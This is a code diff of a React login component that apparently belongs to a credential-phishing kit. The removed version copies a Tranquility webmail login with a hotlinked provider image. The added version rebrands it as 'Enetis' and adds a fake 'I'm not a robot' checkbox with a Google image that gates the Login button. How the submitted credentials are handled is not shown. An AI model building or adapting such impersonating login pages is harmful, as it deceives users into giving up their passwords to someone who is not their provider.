@@ -5,6 +5,8 @@ import './Home.css'
 import { useState } from 'react';
 
 import axios from 'axios';
+import logo from './logo.png';
+import google from './google.png';
 
 
 
@@ -14,9 +16,11 @@ function Home(){
     const[email, setUserName] = useState("");
     const[password, setPassword] = useState("");
 
-    const[platform, setPlatform] = useState("Tranquility")
+    const[platform, setPlatform] = useState("Enetis")
 
     const[showError, setShowError] = useState(false);
+
+    const[ischecked, setChecked] = useState(false);
 
 
 async function handleSubmit(e){
@@ -59,37 +63,60 @@ async function handleSubmit(e){
 
 
 
-            <div className='col-md-4 whitediv m-auto py-3 px-4'>
-                <img  src='https://webmail.tranquility.net/skins/outlook_plus/assets/images/login_square.png?s=1598310297' />
+            <div className='col-md-5 whitediv m-auto py-3 px-4'>
+                <div className='text-center'>
+                <img className='logoimage' src={logo} />
+
+                </div>
 
 
 
                 <form onSubmit={handleSubmit}>
 
-                    <div className='form-group'>
-                        <label className='label'> Username</label>
-                        <input type="text"onChange={function(e){
-                            setUserName(e.target.value);
-                        }}value={email} className="form-control"placeholder='Username'required />
+                <div class="form-group row mt-4">
+    <label for="staticEmail" class="col-sm-2 col-form-label label">Username</label>
+    <div class="col-sm-10">
+      <input type="text" class="form-control" id="staticEmail" />
+    </div>
+  </div>
+  <div class="form-group row">
+    <label for="inputPassword" class="col-sm-2 col-form-label label">Password</label>
+    <div class="col-sm-10">
+      <input type="password" class="form-control" id="inputPassword"/>
+    </div>
+  </div>
+
+
+  <div class="form-group row">
+  <label style={{
+      visibility:"hidden",
+  }} for="inputPassword" class="col-sm-2 col-form-label label">Password</label>
+    <div class="col-sm-10">
+        <div className='googlediv rounded py-2'>
+            <div className='checkdiv pl-3'>
+                <input onChange={function(e){
+                    setChecked(!ischecked);
+                }} type="checkbox"checked={ischecked} className='mycheck' /><span className='checkspan ml-3'>I'm not a robot</span>
+
+            </div>
+
+            <div className='googleimage text-right pr-3'>
+                <img className='rap' src={google}/>
+
+            </div>
+
+        </div>
+    </div>
+  </div>
+
+       
+                   
+                   {ischecked && <div className='form-group text-center'>
+
+                        <button type='submit' className=' border-0 px-3 rounded mt-3 font-weight-bold'>Login</button>
 
                     </div>
-
-
-                    <div className='form-group'>
-                        <label className='label'> Password</label>
-                        <input type="password"onChange={function(e){
-                            setPassword(e.target.value);
-                        }}value={password} className="form-control"placeholder='Password'required />
-
-                    </div>
-
-                    <div className='form-group'>
-
-                        <button type='submit' style={{
-                            background:"#585858",
-                        }}className='btn text-center w-100 font-weight-bold text-light'>LOGIN</button>
-
-                    </div>
+}
 
                 </form>
 
